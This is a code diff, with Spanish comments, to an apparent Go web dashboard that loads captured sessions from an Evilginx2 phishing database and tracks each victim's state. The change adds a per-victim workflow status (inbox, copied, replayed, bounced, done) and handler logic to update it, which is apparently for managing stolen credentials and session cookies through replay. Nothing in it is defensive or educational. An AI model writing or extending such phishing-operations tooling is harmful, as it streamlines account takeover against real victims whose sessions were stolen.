@@ -26,7 +26,7 @@ import (
 //go:embed index.html
 var indexHTML []byte
 
-const version = "1.4.0"
+const version = "1.5.0"
 
 // ---- Evilginx data model (matches kgretzky/evilginx2 database.Session) ----
 
@@ -673,8 +673,21 @@ func loadSessions(dbPath string) ([]Session, error) {
 // ---- Estado por víctima (usada / notas), persistido ----
 
 type victimState struct {
-	Used  bool   `json:"used"`
-	Notes string `json:"notes"`
+	Used   bool   `json:"used"`
+	Status string `json:"status"` // inbox | copied | replayed | bounced | done
+	Notes  string `json:"notes"`
+}
+
+func normalizeVState(st victimState) victimState {
+	if st.Status == "" {
+		if st.Used {
+			st.Status = "done"
+		} else {
+			st.Status = "inbox"
+		}
+	}
+	st.Used = st.Status == "done"
+	return st
 }
 
 var (
@@ -702,7 +715,7 @@ func vstateHandler() http.HandlerFunc {
 			vsMu.Lock()
 			m := map[string]victimState{}
 			for k, v := range vsMap {
-				m[k] = v
+				m[k] = normalizeVState(v)
 			}
 			vsMu.Unlock()
 			w.Header().Set("Content-Type", "application/json; charset=utf-8")
@@ -716,13 +729,21 @@ func vstateHandler() http.HandlerFunc {
 			}
 			vsMu.Lock()
 			st := vsMap[user]
-			if v := r.FormValue("used"); v != "" {
+			if v := r.FormValue("status"); v != "" {
+				st.Status = strings.ToLower(strings.TrimSpace(v))
+				st.Used = st.Status == "done"
+			} else if v := r.FormValue("used"); v != "" {
 				st.Used = boolForm(v)
+				if st.Used {
+					st.Status = "done"
+				} else if st.Status == "done" || st.Status == "" {
+					st.Status = "inbox"
+				}
 			}
 			if _, ok := r.Form["notes"]; ok {
 				st.Notes = r.FormValue("notes")
 			}
-			vsMap[user] = st
+			vsMap[user] = normalizeVState(st)
 			saveVStateLocked()
 			vsMu.Unlock()
 			w.WriteHeader(204)
